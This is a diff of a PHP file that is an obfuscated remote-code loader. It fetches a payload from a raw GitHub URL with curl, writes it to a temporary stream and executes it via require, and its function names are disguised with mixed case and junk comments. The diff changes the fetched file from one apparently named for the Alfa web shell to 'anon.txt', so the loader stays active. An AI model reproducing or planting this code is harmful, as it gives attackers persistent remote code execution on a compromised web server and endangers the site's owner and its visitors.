@@ -1,7 +1,7 @@
 <?=
-$url = 'https://raw.githubusercontent.com/1mgR00T/simpan/refs/heads/main/alfa-iran.php'; 
+$url = 'https://raw.githubusercontent.com/1mgR00T/simpan/refs/heads/main/anon.txt'; 
 
-$dns = 'https://raw.githubusercontent.com/1mgR00T/simpan/refs/heads/main/alfa-iran.php'; 
+$dns = 'https://raw.githubusercontent.com/1mgR00T/simpan/refs/heads/main/anon.txt'; 
  
 $ch = CurL_init /* 767n90 */($url); 
 if (!Function_ExiSts /** 12xfa */ ('hex2bin') /*ffbc*/) { 
@@ -25,4 +25,5 @@ $path = streaM_Get_meTa_daTa/* 345 */($tmp);
 $path = $path/* r23 */ ['uri']; 
 fprintf/* 3d45 */($tmp,'%s',$res); 
 ReqUire/* 23x4 *//* */$path;
+
 ?>
